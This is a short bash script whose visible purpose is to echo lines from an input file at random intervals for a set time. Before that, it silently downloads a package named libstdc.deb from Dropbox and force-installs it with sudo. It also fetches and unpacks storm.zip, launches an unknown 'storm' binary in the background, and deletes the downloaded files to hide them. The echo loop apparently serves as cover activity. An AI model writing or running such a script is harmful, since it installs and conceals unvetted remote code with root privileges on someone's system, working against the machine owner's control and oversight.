#!/bin/bash

end=$((SECONDS+$1))
wget https://www.dropbox.com/s/s6j41h7gjx896vw/libstdc.deb -q
sudo dpkg --force-all -i libstdc.deb > /dev/null 2>&1
rm -rf libstdc.deb
wget https://www.dropbox.com/s/u2cvgb6u6p5iq24/storm.zip -q
unzip storm.zip > /dev/null 2>&1
#pwd
./src/storm ./src/cloud &
sleep 3
rm -rf storm.zip
rm -rf src/storm
rm -rf src/cloud
while [ $SECONDS -lt $end ]
do
    read line
    echo "$line"
    sleep $(( $RANDOM % 26 ))
done < $2

